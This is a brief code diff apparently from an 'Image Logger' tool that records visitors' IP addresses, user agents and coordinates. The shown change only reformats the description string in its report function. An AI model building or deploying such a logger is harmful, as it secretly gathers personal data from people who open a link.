@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"**Logged**"
+            "description": f"""**Logged**
 
 **Endpoint:** `{endpoint}`
             
